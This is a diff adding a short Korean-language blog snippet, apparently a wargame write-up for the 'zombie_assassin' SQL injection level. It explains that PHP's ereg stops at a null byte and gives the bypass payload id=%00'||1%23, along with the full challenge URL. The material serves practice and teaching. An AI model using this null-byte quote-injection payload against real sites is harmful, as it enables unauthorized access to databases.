@@ -1,0 +1,38 @@
+I"�<p>자 문제를 보면</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  if(@ereg("'",$_GET[id])) exit("HeHe"); 
+  if(@ereg("'",$_GET[pw])) exit("HeHe"); 
+</code></pre></div></div>
+<p>ereg가 있다.</p>
+
+<p>취약하다</p>
+
+<p>ereg 와 eregi는 취약하다</p>
+
+<p>ereg는  null값까지만 받고</p>
+
+<p>떄문에 %00을 넣어주고</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>id=%00’</td>
+      <td> </td>
+      <td>1%23</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <tbody>
+    <tr>
+      <td>해주게 되면 id를 그만 입력받고 뒤에 값을</td>
+      <td> </td>
+      <td>연산한후 뒤에 쿼리를 주석처리해 버린다.</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://los.sandbox.cash/chall/zombie_assassin_eb9c4ab86b8c26748f3ce3e91dcd4dd8.php?id=%00%27||1%23
+</code></pre></div></div>
+
+:ET
